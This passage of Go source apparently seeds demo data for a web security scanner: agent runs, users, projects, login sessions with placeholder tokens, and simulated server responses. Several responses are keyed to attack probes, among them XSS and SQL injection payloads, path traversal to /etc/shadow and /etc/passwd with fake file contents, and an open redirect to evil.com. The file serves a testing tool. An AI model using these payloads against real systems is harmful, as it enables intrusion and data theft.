				"probe": map[string]interface{}{"input": 9800, "output": 1400},
			},
			TotalInputTokens:  13000,
			TotalOutputTokens: 1980,
			EstimatedCostUSD:  0.0687,
			StartedAt:         now.Add(-1*time.Hour - 15*time.Minute),
			CompletedAt:       now.Add(-1*time.Hour - 12*time.Minute),
			DurationMs:        180000,
			CreatedAt:         now.Add(-1*time.Hour - 15*time.Minute),
		},
		// 9. Cancelled swarm
		{
			UUID:              "agent-0009-aaaa-bbbb-cccc-ddddeeee0009",
			Mode:              "swarm",
			AgentName:         "claude",
			Protocol:          "sdk",
			Model:             "claude-opus-4-7",
			TargetURL:         "https://example.com",
			Status:            "cancelled",
			CurrentPhase:      "scan",
			PhasesRun:         []string{"discover", "plan"},
			RecordCount:       42,
			ErrorMessage:      "cancelled by user",
			TokenUsage:        map[string]interface{}{"plan": map[string]interface{}{"input": 8500, "output": 1400}},
			TotalInputTokens:  8500,
			TotalOutputTokens: 1400,
			EstimatedCostUSD:  0.2325,
			SessionDir:        "~/.vigolium/agent-sessions/agent-0009",
			StartedAt:         now.Add(-8 * time.Hour),
			CompletedAt:       now.Add(-7*time.Hour - 45*time.Minute),
			DurationMs:        900000,
			CreatedAt:         now.Add(-8 * time.Hour),
		},
		// 10. Pending query — just queued
		{
			UUID:       "agent-0010-aaaa-bbbb-cccc-ddddeeee0010",
			Mode:       "query",
			AgentName:  "claude",
			Protocol:   "sdk",
			Model:      "claude-sonnet-4-6",
			TemplateID: "code-review",
			TargetURL:  "https://blog.test",
			Status:     "pending",
			PromptSent: "Perform a security code review of the blog application focusing on comment handling and content injection vectors.",
			CreatedAt:  now.Add(-30 * time.Second),
		},
	}
}

// ---------------------------------------------------------------------------
// User seeds
// ---------------------------------------------------------------------------

func seedUsers() []*database.User {
	now := time.Now()
	return []*database.User{
		{
			UUID:      "user-0001-aaaa-bbbb-cccc-ddddeeee0001",
			Email:     "admin@vigolium.dev",
			Name:      "Admin User",
			CreatedAt: now.Add(-30 * 24 * time.Hour),
			UpdatedAt: now.Add(-1 * time.Hour),
		},
		{
			UUID:      "user-0002-aaaa-bbbb-cccc-ddddeeee0002",
			Email:     "analyst@vigolium.dev",
			Name:      "Security Analyst",
			CreatedAt: now.Add(-14 * 24 * time.Hour),
			UpdatedAt: now.Add(-3 * time.Hour),
		},
		{
			UUID:      "user-0003-aaaa-bbbb-cccc-ddddeeee0003",
			Email:     "ci-bot@vigolium.dev",
			Name:      "CI Pipeline Bot",
			CreatedAt: now.Add(-7 * 24 * time.Hour),
			UpdatedAt: now.Add(-7 * 24 * time.Hour),
		},
	}
}

// ---------------------------------------------------------------------------
// Project seeds
// ---------------------------------------------------------------------------

func seedProjects(users []*database.User) []*database.Project {
	now := time.Now()
	return []*database.Project{
		{
			UUID:          database.DefaultProjectUUID,
			Name:          "Default Project",
			Description:   "Default project for all scan data when no project is specified",
			OwnerUUID:     users[0].UUID,
			ConfigPath:    "~/.vigolium/vigolium-configs.yaml",
			Tags:          []string{"default", "local"},
			DefaultTarget: "https://example.com",
			LastScanAt:    now.Add(-10 * time.Minute),
			CreatedAt:     now.Add(-30 * 24 * time.Hour),
			UpdatedAt:     now.Add(-1 * time.Hour),
		},
		{
			UUID:          "proj-0002-aaaa-bbbb-cccc-ddddeeee0002",
			Name:          "E-Commerce Platform Audit",
			Description:   "Security assessment of the api.shop.local e-commerce platform including API and frontend",
			OwnerUUID:     users[1].UUID,
			ConfigPath:    "~/.vigolium/projects/shop-audit.yaml",
			Tags:          []string{"ecommerce", "api", "quarterly-audit"},
			DefaultTarget: "https://api.shop.local",
			LastScanAt:    now.Add(-4*time.Hour - 30*time.Minute),
			CreatedAt:     now.Add(-7 * 24 * time.Hour),
			UpdatedAt:     now.Add(-2 * time.Hour),
		},
		{
			UUID:          "proj-0003-aaaa-bbbb-cccc-ddddeeee0003",
			Name:          "Blog Application Pentest",
			Description:   "Targeted pentest of blog.test for XSS and content injection vulnerabilities",
			OwnerUUID:     users[1].UUID,
			Tags:          []string{"pentest", "xss-focused"},
			DefaultTarget: "https://blog.test",
			LastScanAt:    now.Add(-10 * time.Minute),
			CreatedAt:     now.Add(-3 * 24 * time.Hour),
			UpdatedAt:     now.Add(-3 * time.Hour),
		},
		{
			UUID:          "proj-0004-aaaa-bbbb-cccc-ddddeeee0004",
			Name:          "CI Nightly Scan",
			Description:   "Automated nightly security scans triggered by CI pipeline",
			OwnerUUID:     users[2].UUID,
			ConfigPath:    "~/.vigolium/projects/ci-nightly.yaml",
			Tags:          []string{"ci", "automated", "nightly"},
			DefaultTarget: "https://example.com",
			LastScanAt:    now.Add(-12 * time.Hour),
			CreatedAt:     now.Add(-1 * 24 * time.Hour),
			UpdatedAt:     now.Add(-12 * time.Hour),
		},
	}
}

// ---------------------------------------------------------------------------
// Session hostname seeds
// ---------------------------------------------------------------------------

func seedAuthenticationHostnames(scans []*database.Scan) []*database.AuthenticationHostname {
	now := time.Now()
	return []*database.AuthenticationHostname{
		// example.com — admin session with static Bearer token
		{
			Hostname:     "example.com",
			ScanUUID:     scans[0].UUID,
			SessionName:  "admin",
			SessionRole:  "administrator",
			Position:     0,
			SessionToken: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.fake-admin-token",
			Headers:      map[string]string{"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.fake-admin-token"},
			Source:       "manual",
			CreatedAt:    now.Add(-2 * time.Hour),
			UpdatedAt:    now.Add(-2 * time.Hour),
		},
		// example.com — regular user session with static Bearer token
		{
			Hostname:     "example.com",
			ScanUUID:     scans[0].UUID,
			SessionName:  "user",
			SessionRole:  "user",
			Position:     1,
			SessionToken: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJ1c2VyIn0.fake-user-token",
			Headers:      map[string]string{"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJ1c2VyIn0.fake-user-token"},
			Source:       "manual",
			CreatedAt:    now.Add(-2 * time.Hour),
			UpdatedAt:    now.Add(-2 * time.Hour),
		},
		// api.shop.local — authenticated session via login flow (token extracted)
		{
			Hostname:         "api.shop.local",
			ScanUUID:         scans[1].UUID,
			SessionName:      "shop-admin",
			SessionRole:      "admin",
			Position:         0,
			LoginURL:         "https://api.shop.local/api/v1/auth/login",
			LoginMethod:      "POST",
			LoginContentType: "application/json",
			LoginBody:        `{"username":"admin","password":"admin123"}`,
			LoginRequest:     "POST /api/v1/auth/login HTTP/1.1\r\nHost: api.shop.local\r\nContent-Type: application/json\r\n\r\n{\"username\":\"admin\",\"password\":\"admin123\"}",
			LoginResponse:    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"token\":\"eyJhbGciOiJIUzI1NiJ9.shop-admin-token\",\"expires_in\":3600}",
			SessionToken:     "eyJhbGciOiJIUzI1NiJ9.shop-admin-token",
			Headers:          map[string]string{"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.shop-admin-token"},
			ExtractRules:     `[{"source":"body","name":"token","type":"json","expression":"$.token","apply_as":"header","header_name":"Authorization","header_prefix":"Bearer "}]`,
			Source:           "agent",
			HydratedAt:       ptrTime(now.Add(-85 * time.Minute)),
			CreatedAt:        now.Add(-90 * time.Minute),
			UpdatedAt:        now.Add(-85 * time.Minute),
		},
		// api.shop.local — regular customer session (token extracted)
		{
			Hostname:         "api.shop.local",
			ScanUUID:         scans[1].UUID,
			SessionName:      "shop-customer",
			SessionRole:      "customer",
			Position:         1,
			LoginURL:         "https://api.shop.local/api/v1/auth/login",
			LoginMethod:      "POST",
			LoginContentType: "application/json",
			LoginBody:        `{"username":"customer1","password":"custpass"}`,
			SessionToken:     "eyJhbGciOiJIUzI1NiJ9.shop-customer-token",
			Headers:          map[string]string{"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.shop-customer-token"},
			ExtractRules:     `[{"source":"body","name":"token","type":"json","expression":"$.token","apply_as":"header","header_name":"Authorization","header_prefix":"Bearer "}]`,
			Source:           "agent",
			HydratedAt:       ptrTime(now.Add(-88 * time.Minute)),
			CreatedAt:        now.Add(-90 * time.Minute),
			UpdatedAt:        now.Add(-88 * time.Minute),
		},
		// blog.test — cookie-based session
		{
			Hostname:     "blog.test",
			ScanUUID:     scans[2].UUID,
			SessionName:  "blogger",
			SessionRole:  "author",
			Position:     0,
			SessionToken: "session_id=abc123def456; csrf_token=xyz789",
			Headers:      map[string]string{"Cookie": "session_id=abc123def456; csrf_token=xyz789"},
			Source:       "manual",
			CreatedAt:    now.Add(-30 * time.Minute),
			UpdatedAt:    now.Add(-30 * time.Minute),
		},
		// legacy.example.com — basic auth session
		{
			Hostname:     "legacy.example.com",
			SessionName:  "legacy-admin",
			SessionRole:  "admin",
			Position:     0,
			SessionToken: "Basic YWRtaW46cGFzc3dvcmQ=",
			Headers:      map[string]string{"Authorization": "Basic YWRtaW46cGFzc3dvcmQ="},
			Source:       "manual",
			CreatedAt:    now.Add(-2 * time.Hour),
			UpdatedAt:    now.Add(-2 * time.Hour),
		},
	}
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

func ptrTime(t time.Time) *time.Time {
	return &t
}

func hasAuthHeader(headers map[string][]string) bool {
	for name := range headers {
		lower := strings.ToLower(name)
		if lower == "authorization" || lower == "cookie" || lower == "x-api-key" {
			return true
		}
	}
	return false
}

// computeRiskScore maps remarks and status to a 0–100 risk hint for sorting.
func computeRiskScore(remarks []string, status int) int {
	score := 0
	for _, r := range remarks {
		switch {
		case strings.HasPrefix(r, "sqli"):
			score += 40
		case strings.HasPrefix(r, "xss"):
			score += 30
		case strings.HasPrefix(r, "lfi"):
			score += 35
		case strings.HasPrefix(r, "open-redirect"):
			score += 15
		case strings.Contains(r, "forbidden-bypass"), strings.Contains(r, "admin"):
			score += 20
		case strings.Contains(r, "data-leak"):
			score += 25
		default:
			score += 5
		}
	}
	if status == 500 {
		score += 10
	}
	if score > 100 {
		score = 100
	}
	return score
}

func buildRawRequest(method, path, hostname string, port int, scheme string, headers map[string][]string, body []byte) []byte {
	var b strings.Builder
	fmt.Fprintf(&b, "%s %s HTTP/1.1\r\n", method, path)

	hostVal := hostname
	if (scheme == "https" && port != 443) || (scheme == "http" && port != 80) {
		hostVal = fmt.Sprintf("%s:%d", hostname, port)
	}

	// Write Host header first, then the rest
	fmt.Fprintf(&b, "Host: %s\r\n", hostVal)
	for k, vals := range headers {
		if strings.EqualFold(k, "Host") {
			continue
		}
		for _, v := range vals {
			fmt.Fprintf(&b, "%s: %s\r\n", k, v)
		}
	}
	b.WriteString("\r\n")
	if len(body) > 0 {
		b.Write(body)
	}
	return []byte(b.String())
}

func buildRawResponse(status int, phrase string, headers map[string][]string, contentType string, body []byte) []byte {
	if status == 0 {
		return nil
	}
	var b strings.Builder
	fmt.Fprintf(&b, "HTTP/1.1 %d %s\r\n", status, phrase)
	for k, vals := range headers {
		for _, v := range vals {
			fmt.Fprintf(&b, "%s: %s\r\n", k, v)
		}
	}
	if len(body) > 0 {
		fmt.Fprintf(&b, "Content-Length: %d\r\n", len(body))
	}
	b.WriteString("\r\n")
	if len(body) > 0 {
		b.Write(body)
	}
	return []byte(b.String())
}

// ---------------------------------------------------------------------------
// Response body generators — produce realistic content for seed data
// ---------------------------------------------------------------------------

// generateSeedBody produces a realistic response body based on the endpoint.
func generateSeedBody(ep seedEndpoint, h seedHost) []byte {
	if ep.bodyLen == 0 {
		return nil
	}

	hostPort := h.hostname
	if (h.scheme == "https" && h.port != 443) || (h.scheme == "http" && h.port != 80) {
		hostPort = fmt.Sprintf("%s:%d", h.hostname, h.port)
	}

	// --- Vulnerability-specific responses (order matters: check specific paths first) ---

	if strings.Contains(ep.path, "script>alert(1)") {
		return []byte(`<!DOCTYPE html>
<html><head><title>Search Results</title></head>
<body>
<h1>Search Results</h1>
<p>You searched for: <script>alert(1)</script></p>
<p>No results found for your query.</p>
<form action="/search" method="GET"><input type="text" name="q" value="<script>alert(1)</script>"><button>Search</button></form>
</body></html>`)
	}

	if strings.Contains(ep.path, "onerror=alert") {
		return []byte(`<!DOCTYPE html>
<html><head><title>Search Results</title></head>
<body>
<h1>Search Results</h1>
<p>You searched for: <img src=x onerror=alert(1)></p>
<p>No results found for your query.</p>
</body></html>`)
	}

	if strings.Contains(ep.path, "UNION+SELECT") {
		return []byte(`{"results":[{"id":1,"name":"admin","price":"s3cr3t_p@ssw0rd"},{"id":2,"name":"root","price":"r00t_p@ss!"},{"id":3,"name":"db_version","price":"PostgreSQL 14.2"}],"total":3}`)
	}

	if strings.Contains(ep.path, "' OR 1=1--") {
		return []byte(`{"error":"near \"OR\": syntax error","detail":"SELECT * FROM users WHERE id = '1' OR 1=1--'","code":"SQLITE_ERROR"}`)
	}

	if strings.Contains(ep.path, "file=../../../etc/shadow") {
		return []byte("root:$6$rounds=656000$ABC123$XYZhashvalue:18000:0:99999:7:::\ndaemon:*:18000:0:99999:7:::\nbin:*:18000:0:99999:7:::\nsys:*:18000:0:99999:7:::\nwww-data:$6$rounds=656000$DEF456$ABChashvalue:18200:0:99999:7:::\npostgres:$6$rounds=656000$GHI789$DEFhashvalue:18300:0:99999:7:::\n")
	}

	if strings.Contains(ep.path, "page=../../../etc/passwd") {
		return []byte(`<!DOCTYPE html>
<html><head><title>Legacy Portal</title></head>
<body>
<div class="content">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
postgres:x:109:117:PostgreSQL administrator:/var/lib/postgresql:/bin/bash</div>
</body></html>`)
	}

	if strings.Contains(ep.path, "/admin/settings") && ep.method == "POST" {
		return []byte(`<!DOCTYPE html>
<html><head><title>Settings Saved — Admin</title></head>
<body>
<h1>Settings Updated</h1>
<div class="flash success">Settings saved successfully.</div>
<table>
<tr><td>SMTP Host</td><td>mail.example.com</td></tr>
<tr><td>SMTP Port</td><td>587</td></tr>
<tr><td>Debug</td><td>49</td></tr>
</table>
<a href="/admin/settings">Back to Settings</a>
</body></html>`)
	}

	if strings.Contains(ep.path, "Injected-Header") {
		return []byte("id,name,email,role\n1,admin,admin@example.com,administrator\n2,john,john@example.com,user\n3,jane,jane@example.com,editor\n4,bob,bob@example.com,user\n5,alice,alice@example.com,moderator\n")
	}

	if strings.Contains(ep.path, "url=https://evil.com") {
		return nil
	}

	if strings.Contains(ep.path, "/users/me") {
		return []byte(`{"id":1,"email":"user@shop.local","name":"Shop Admin","role":"admin","api_key":"sk-live-abc123xyz789def456","created_at":"2025-11-15T09:00:00Z","last_login":"2026-02-25T08:30:00Z"}`)
	}

	// --- JSON API responses ---
	if ep.contentType == "application/json" {
		return generateJSONSeedBody(ep)
	}

	// --- HTML responses ---
	if strings.Contains(ep.contentType, "text/html") {
		return generateHTMLSeedBody(ep, hostPort)
	}

	// --- Other content types ---
	switch ep.contentType {
	case "text/css":
		return []byte(`/* Main stylesheet */
:root { --primary: #2563eb; --bg: #ffffff; --text: #1e293b; }
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; color: var(--text); background: var(--bg); line-height: 1.6; }
.container { max-width: 1200px; margin: 0 auto; padding: 0 1rem; }
nav { background: var(--primary); padding: 1rem; }
nav a { color: #fff; text-decoration: none; margin-right: 1rem; }
.btn { display: inline-block; padding: 0.5rem 1rem; background: var(--primary); color: #fff; border: none; border-radius: 4px; cursor: pointer; }
.btn:hover { opacity: 0.9; }`)
	case "application/javascript":
		return []byte(`(function(){"use strict";const APP_VERSION="2.1.0";const api={baseUrl:"/api",async get(path){const r=await fetch(this.baseUrl+path,{headers:{"Accept":"application/json"}});if(!r.ok)throw new Error(r.statusText);return r.json()},async post(path,data){const r=await fetch(this.baseUrl+path,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});return r.json()}};document.addEventListener("DOMContentLoaded",()=>{console.log("App "+APP_VERSION+" loaded");const nav=document.querySelector("nav");if(nav){nav.querySelectorAll("a").forEach(a=>{if(a.href===location.href)a.classList.add("active")})}});window.App={api,version:APP_VERSION};})();`)
	case "text/plain":
		if strings.Contains(ep.path, "robots.txt") {
			return []byte("User-agent: *\nDisallow: /admin/\nDisallow: /cgi-bin/\nDisallow: /api/\nAllow: /api/v1/products\nSitemap: https://example.com/sitemap.xml\n")
		}
		return []byte(fmt.Sprintf("%s %s — plain text response", ep.method, ep.path))
	case "application/xml":
		if strings.Contains(ep.path, "sitemap") {
			return []byte(`<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>https://example.com/</loc><lastmod>2026-02-25</lastmod><priority>1.0</priority></url>
  <url><loc>https://example.com/about</loc><lastmod>2026-02-20</lastmod><priority>0.8</priority></url>
  <url><loc>https://example.com/contact</loc><lastmod>2026-02-18</lastmod><priority>0.7</priority></url>
  <url><loc>https://example.com/login</loc><lastmod>2026-02-15</lastmod><priority>0.6</priority></url>
  <url><loc>https://example.com/search</loc><lastmod>2026-02-25</lastmod><priority>0.9</priority></url>
</urlset>`)
		}
		return []byte(fmt.Sprintf(`<?xml version="1.0"?><response><status>%d</status><path>%s</path></response>`, ep.status, ep.path))
	case "application/rss+xml":
		return []byte(`<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>Blog — Latest Posts</title>
    <link>https://blog.test</link>
    <description>Security research and tutorials</description>
    <item>
      <title>Hello World</title>
      <link>https://blog.test/post/hello-world</link>
      <description>Welcome to the blog! This is our first post covering the basics of web security.</description>
      <pubDate>Mon, 24 Feb 2026 10:00:00 GMT</pubDate>
    </item>
    <item>
      <title>SQL Injection 101</title>
      <link>https://blog.test/post/sql-injection-101</link>
      <description>A comprehensive guide to understanding and preventing SQL injection vulnerabilities.</description>
      <pubDate>Sun, 23 Feb 2026 14:30:00 GMT</pubDate>
    </item>
  </channel>
</rss>`)
	case "text/xml":
		return []byte(`<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUserResponse>
      <User>
        <ID>1</ID>
        <Name>John Doe</Name>
        <Email>john@example.com</Email>
        <Role>admin</Role>
        <LastLogin>2026-02-25T08:15:00Z</LastLogin>
      </User>
    </GetUserResponse>
  </soap:Body>
</soap:Envelope>`)
	case "text/csv":
		return []byte("id,name,email,role\n1,admin,admin@example.com,administrator\n2,john,john@example.com,user\n3,jane,jane@example.com,editor\n")
	}

	// Binary/media types
	if strings.HasPrefix(ep.contentType, "image/") || strings.HasPrefix(ep.contentType, "font/") || strings.HasPrefix(ep.contentType, "video/") {
		return []byte(fmt.Sprintf("[binary %s data — %d bytes]", ep.contentType, ep.bodyLen))
	}

	return []byte(fmt.Sprintf("[%d %s — response body for %s]", ep.status, ep.phrase, ep.path))
}

func generateJSONSeedBody(ep seedEndpoint) []byte {
	path := ep.path

	// Product list
	if strings.Contains(path, "/products") && ep.method == "GET" && !strings.Contains(path, "/42") && !strings.Contains(path, "/99") && !strings.Contains(path, "search=") {
		return []byte(`{"data":[{"id":1,"name":"Wireless Mouse","price":24.99,"category":"electronics","in_stock":true},{"id":2,"name":"USB-C Cable","price":12.99,"category":"electronics","in_stock":true},{"id":42,"name":"Widget Pro","price":29.99,"category":"electronics","in_stock":true},{"id":43,"name":"Ergonomic Keyboard","price":79.99,"category":"electronics","in_stock":false}],"total":47,"limit":20,"offset":0}`)
	}

	// Single product GET
	if strings.Contains(path, "/products/42") && ep.method == "GET" {
		return []byte(`{"id":42,"name":"Widget Pro","price":29.99,"category":"electronics","description":"Professional-grade widget with enhanced features","sku":"WP-042","in_stock":true,"created_at":"2026-01-10T12:00:00Z","updated_at":"2026-02-20T09:30:00Z"}`)
	}

	// Product PUT
	if strings.Contains(path, "/products/42") && ep.method == "PUT" {
		return []byte(`{"id":42,"name":"Widget Pro v2","price":34.99,"category":"electronics","description":"Professional-grade widget with enhanced features","sku":"WP-042","in_stock":true,"updated_at":"2026-02-25T10:00:00Z"}`)
	}

	// Product PATCH
	if strings.Contains(path, "/products/42") && ep.method == "PATCH" {
		return []byte(`{"id":42,"name":"Widget Pro v2","price":39.99,"category":"electronics","sku":"WP-042","in_stock":true,"updated_at":"2026-02-25T10:15:00Z"}`)
	}

	// Product POST (create)
	if strings.Contains(path, "/products") && ep.method == "POST" {
		return []byte(`{"id":101,"name":"Widget Pro","price":29.99,"category":"electronics","sku":"WP-101","in_stock":true,"created_at":"2026-02-25T10:05:00Z"}`)
	}

	// Orders list
	if strings.Contains(path, "/orders") && ep.method == "GET" {
		return []byte(`{"data":[{"id":497,"product_id":12,"quantity":1,"status":"pending","total":24.99,"created_at":"2026-02-24T16:00:00Z"},{"id":498,"product_id":42,"quantity":3,"status":"pending","total":89.97,"created_at":"2026-02-24T18:30:00Z"},{"id":499,"product_id":7,"quantity":1,"status":"pending","total":149.00,"created_at":"2026-02-25T08:00:00Z"}],"total":47,"limit":10,"offset":0}`)
	}

	// Order POST (create)
	if strings.Contains(path, "/orders") && ep.method == "POST" {
		return []byte(`{"id":501,"product_id":42,"quantity":2,"shipping":"express","status":"confirmed","total":69.98,"estimated_delivery":"2026-02-28T12:00:00Z","created_at":"2026-02-25T10:10:00Z"}`)
	}

	// Health
	if strings.Contains(path, "/health") {
		return []byte(`{"status":"healthy","uptime":"47h23m","version":"2.1.0"}`)
	}

	// Auth login
	if strings.Contains(path, "/auth/login") {
		return []byte(`{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZW1haWwiOiJ1c2VyQHNob3AubG9jYWwiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDA0NjAwMDAsImV4cCI6MTc0MDU0NjQwMH0.abc123","expires_in":86400,"token_type":"Bearer"}`)
	}

	// 401 Unauthorized
	if ep.status == 401 {
		return []byte(`{"error":"unauthorized","message":"Valid Bearer token required"}`)
	}

	// 413 Payload too large
	if ep.status == 413 {
		return []byte(`{"error":"payload_too_large","message":"Request body exceeds maximum size of 10MB","max_size":"10485760"}`)
	}

	// Beta/experimental
	if strings.Contains(path, "/beta/") || strings.Contains(path, "/experimental") {
		return []byte(`{"status":"ok","feature":"experimental-v2","enabled":true,"version":"0.1.0-beta"}`)
	}

	// GraphQL
	if strings.Contains(path, "/graphql") {
		return []byte(`{"data":{"user":{"id":1,"name":"John Doe","email":"john@example.com","role":"admin","created_at":"2025-11-15T09:00:00Z"}}}`)
	}

	// Default JSON
	return []byte(fmt.Sprintf(`{"status":"ok","path":"%s","timestamp":"2026-02-25T10:00:00Z"}`, path))
}

func generateHTMLSeedBody(ep seedEndpoint, hostPort string) []byte {
	title := ep.title
	if title == "" {
		title = fmt.Sprintf("%d %s", ep.status, ep.phrase)
	}

	// Error pages
	if ep.status == 403 {
		return []byte(fmt.Sprintf(`<!DOCTYPE html>
<html><head><title>403 Forbidden</title></head>
<body>
<h1>403 Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<p>If you believe this is an error, contact the administrator.</p>
<hr><address>nginx/1.24 at %s</address>
</body></html>`, hostPort))
	}
	if ep.status == 404 {
		return []byte(fmt.Sprintf(`<!DOCTYPE html>
<html><head><title>Page Not Found</title></head>
<body>
<h1>404 — Page Not Found</h1>
<p>The page you requested could not be found.</p>
<p><a href="/">Return to homepage</a></p>
<hr><address>nginx/1.24 at %s</address>
</body></html>`, hostPort))
	}
	if ep.status == 504 {
		return []byte(`<html><head><title>504 Gateway Timeout</title></head><body><h1>504 Gateway Timeout</h1><p>The upstream server did not respond in time.</p></body></html>`)
	}

	path := strings.SplitN(ep.path, "?", 2)[0]

	switch {
	// --- example.com ---
	case path == "/" && hostPort == "example.com":
		return []byte(`<!DOCTYPE html>
<html><head><title>Example Domain — Home</title><meta charset="UTF-8"></head>
<body>
<nav><a href="/">Home</a> <a href="/about">About</a> <a href="/contact">Contact</a> <a href="/login">Login</a></nav>
<main>
<h1>Welcome to Example Domain</h1>
<p>This is a demonstration website used for testing and development purposes.</p>
<div class="features">
  <div class="feature"><h3>Feature One</h3><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit.</p></div>
  <div class="feature"><h3>Feature Two</h3><p>Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p></div>
</div>
</main>
<footer><p>&copy; 2026 Example Domain</p></footer>
</body></html>`)

	case path == "/about":
		return []byte(`<!DOCTYPE html>
<html><head><title>About Us — Example</title></head>
<body>
<nav><a href="/">Home</a> <a href="/about">About</a> <a href="/contact">Contact</a></nav>
<main>
<h1>About Us</h1>
<p>We are a technology company focused on building secure web applications.</p>
<p>Founded in 2020, our team of engineers works on cutting-edge security solutions.</p>
<h2>Our Team</h2>
<ul><li>Jane Doe — CEO</li><li>John Smith — CTO</li><li>Alice Johnson — Lead Engineer</li></ul>
</main>
</body></html>`)

	case path == "/contact":
		return []byte(`<!DOCTYPE html>
<html><head><title>Contact — Example</title></head>
<body>
<nav><a href="/">Home</a> <a href="/about">About</a> <a href="/contact">Contact</a></nav>
<main>
<h1>Contact Us</h1>
<form action="/contact" method="POST">
  <label>Name: <input type="text" name="name" required></label>
  <label>Email: <input type="email" name="email" required></label>
  <label>Message: <textarea name="message" rows="4" required></textarea></label>
  <button type="submit">Send Message</button>
</form>
<p>Email: contact@example.com | Phone: +1 (555) 123-4567</p>
</main>
</body></html>`)

	case path == "/login" && ep.method == "GET":
		return []byte(`<!DOCTYPE html>
<html><head><title>Login</title></head>
<body>
<main>
<h1>Sign In</h1>
<form action="/login" method="POST">
  <label>Username: <input type="text" name="username" required autocomplete="username"></label>
  <label>Password: <input type="password" name="password" required autocomplete="current-password"></label>
  <label><input type="checkbox" name="remember"> Remember me</label>
  <button type="submit">Sign In</button>
</form>
<p><a href="/forgot-password">Forgot password?</a></p>
</main>
</body></html>`)

	case path == "/dashboard":
		return []byte(`<!DOCTYPE html>
<html><head><title>Dashboard — Example</title></head>
<body>
<nav><a href="/dashboard">Dashboard</a> <a href="/profile/1">Profile</a> <a href="/account/preferences">Settings</a> <a href="/logout">Logout</a></nav>
<main>
<h1>Dashboard</h1>
<div class="stats">
  <div class="stat"><h3>Total Requests</h3><span>1,542</span></div>
  <div class="stat"><h3>Active Users</h3><span>23</span></div>
  <div class="stat"><h3>Findings</h3><span>7</span></div>
</div>
<h2>Recent Activity</h2>
<table>
  <tr><td>2026-02-25 10:30</td><td>User admin logged in</td></tr>
  <tr><td>2026-02-25 10:28</td><td>Scan completed — 3 findings</td></tr>
  <tr><td>2026-02-25 09:15</td><td>New records imported — 50 URLs</td></tr>
</table>
</main>
</body></html>`)

	case strings.HasPrefix(path, "/search"):
		q := "test"
		for _, p := range ep.params {
			if p.Name == "q" {
				q = p.Value
				break
			}
		}
		return []byte(fmt.Sprintf(`<!DOCTYPE html>
<html><head><title>Search Results — %s</title></head>
<body>
<h1>Search Results</h1>
<p>Showing results for: %s</p>
<form action="/search" method="GET"><input type="text" name="q" value="%s"><button>Search</button></form>
<div class="results">
  <div class="result"><a href="/page1">Result 1</a><p>First matching result for your search query.</p></div>
  <div class="result"><a href="/page2">Result 2</a><p>Another relevant page matching your search.</p></div>
</div>
<div class="pagination"><span>Page 1 of 1</span></div>
</body></html>`, q, q, q))

	case path == "/profile/1":
		return []byte(`<!DOCTYPE html>
<html><head><title>User Profile</title></head>
<body>
<h1>User Profile</h1>
<div class="profile">
  <div class="avatar"><img src="/images/avatar-1.png" alt="admin"></div>
  <table>
    <tr><td>Username</td><td>admin</td></tr>
    <tr><td>Email</td><td>admin@example.com</td></tr>
    <tr><td>Role</td><td>Administrator</td></tr>
    <tr><td>Joined</td><td>November 15, 2025</td></tr>
    <tr><td>Last Login</td><td>February 25, 2026 08:30</td></tr>
  </table>
</div>
</body></html>`)

	case path == "/account/preferences":
		return []byte(`<!DOCTYPE html>
<html><head><title>Preferences</title></head>
<body>
<h1>Account Preferences</h1>
<form action="/account/preferences" method="POST">
  <h2>Display</h2>
  <label>Theme: <select name="theme"><option value="dark" selected>Dark</option><option value="light">Light</option></select></label>
  <label>Language: <select name="lang"><option value="en" selected>English</option><option value="es">Español</option></select></label>
  <h2>Notifications</h2>
  <label><input type="checkbox" name="email_notify" checked> Email notifications</label>
  <label><input type="checkbox" name="scan_alerts" checked> Scan completion alerts</label>
  <button type="submit">Save Preferences</button>
</form>
</body></html>`)

	// --- blog.test ---
	case path == "/" && strings.Contains(hostPort, "blog"):
		return []byte(`<!DOCTYPE html>
<html><head><title>Blog — Latest Posts</title></head>
<body>
<header><h1>Security Blog</h1><nav><a href="/">Home</a> <a href="/feed/rss">RSS</a></nav></header>
<main>
  <article>
    <h2><a href="/post/hello-world">Hello World</a></h2>
    <time>February 24, 2026</time>
    <p>Welcome to the blog! This is our first post covering the basics of web security testing and vulnerability assessment.</p>
    <span class="tags"><a href="/tag/security">security</a> <a href="/tag/intro">intro</a></span>
  </article>
  <article>
    <h2><a href="/post/sql-injection-101">SQL Injection 101</a></h2>
    <time>February 23, 2026</time>
    <p>A comprehensive guide to understanding and preventing SQL injection vulnerabilities in modern web applications.</p>
    <span class="tags"><a href="/tag/security">security</a> <a href="/tag/sqli">sqli</a></span>
  </article>
